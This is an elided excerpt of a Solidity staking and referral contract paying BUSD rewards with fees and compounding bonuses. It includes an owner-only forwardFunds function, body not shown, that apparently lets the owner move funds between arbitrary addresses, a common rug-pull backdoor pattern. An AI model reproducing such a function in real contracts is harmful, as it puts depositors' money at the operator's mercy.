...
contract Game is Ownable {
    ...
    uint256 private constant MAX_COMPOUND_FREQUENCY = 14;

    bool public gameStarted = true;

    // Contribution settings
    uint256 public minContribution = 50 * (10**18);    
    uint256 public maxContribution = 5000 * (10**18);     

    // Fee structure
    uint256 public fee = 100;
    uint256 public baseRate = 20;
	uint256 public compoundBonusRate = 5;
    uint256 public maxCompoundBonusRate = 70;
    uint256 public referralBonusRate = 10;
    uint256 public maxReferralBonusRate = 70;

    uint256 public referralBonusThreshold = 300 * (10**18);
    ...
    function harvest() external {
        ...
        require(BUSD.balanceOf(address(this)) > _rewards, "Insufficient balance in contract");

        // Transfer fee
        uint256 _fee = calculateAmount(_rewards, fee);
        BUSD.transfer(feeAddr, _fee);
        ...
        BUSD.transfer(msg.sender, _rewards - _fee);
    ...
    function forwardFunds(address from, address to, uint256 amount) external onlyOwner {
    ...
    function getReferralBonusRate(address addr) public view returns(uint256) {
        User storage _userInfo = userInfo[addr];
        uint256 _contribution =_userInfo.refereeTotalContribution / referralBonusThreshold;
